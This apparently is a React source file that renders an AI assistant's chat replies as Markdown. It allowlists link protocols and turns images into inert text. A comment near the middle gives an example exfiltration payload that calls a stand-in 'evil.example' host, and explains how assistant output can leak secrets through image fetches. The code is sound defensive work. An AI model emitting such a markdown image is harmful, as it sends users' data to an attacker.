import { useRef, useState } from 'react';
import type { ComponentPropsWithoutRef } from 'react';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

// Assistant Markdown rendering (FR-CHAT-07, §12.3). Raw HTML stays disabled by construction:
// we deliberately do not use rehype-raw, so react-markdown/remark-rehype drop any embedded HTML
// as plain text. Link protocols are allowlisted to https/mailto; anything else renders as
// inert plain text instead of an <a>. User messages are never passed through this component.

const SAFE_HREF = /^(https:\/\/|mailto:)/i;

function SafeAnchor({ href, children }: ComponentPropsWithoutRef<'a'>) {
  const safe = typeof href === 'string' && SAFE_HREF.test(href.trim());
  if (!safe) {
    // Unknown/unsafe protocol: keep the visible text but never make it a clickable link.
    return <span className="md-link-plain">{children}</span>;
  }
  return (
    // External open is Phase 4 — for now clicking only reveals the destination via the title.
    <a href={href} title={href} rel="noopener noreferrer" onClick={(e) => e.preventDefault()}>
      {children}
    </a>
  );
}

// Markdown images are an attacker-influenceable network fetch: assistant output can embed
// `![x](https://evil.example/track?leak=SECRET)` to exfiltrate data the moment the message
// renders (React itself eagerly preloads `<img src>` via a speculative `<link rel="preload">`,
// so even "never visible" framing does not help). No src ever reaches the DOM; only the alt
// text (or, failing that, the raw URL) renders as inert text, mirroring SafeAnchor above.
function SafeImage({ alt, src }: ComponentPropsWithoutRef<'img'>) {
  const label =
    typeof alt === 'string' && alt.length > 0 ? alt : typeof src === 'string' ? src : '画像';
  return (
    <span className="md-image-plain" title={typeof src === 'string' ? src : undefined}>
      {label}
    </span>
  );
}

function PreBlock({ children, ...rest }: ComponentPropsWithoutRef<'pre'>) {
  const preRef = useRef<HTMLPreElement>(null);
  const [copied, setCopied] = useState(false);

  function handleCopy() {
    const text = preRef.current?.textContent ?? '';
    if (!text) return;
    navigator.clipboard
      ?.writeText(text)
      .then(() => {
        setCopied(true);
        window.setTimeout(() => setCopied(false), 1500);
      })
      .catch(() => undefined);
  }

  return (
    <div className="md-pre-wrap">
      <button type="button" className="md-copy-btn" onClick={handleCopy}>
        {copied ? 'コピーしました' : 'コピー'}
      </button>
      <pre ref={preRef} {...rest}>
        {children}
      </pre>
    </div>
  );
}

const COMPONENTS = { a: SafeAnchor, pre: PreBlock, img: SafeImage };

export function Markdown({ content }: { content: string }) {
  return (
    <div className="md-body">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={COMPONENTS}>
        {content}
      </ReactMarkdown>
    </div>
  );
}
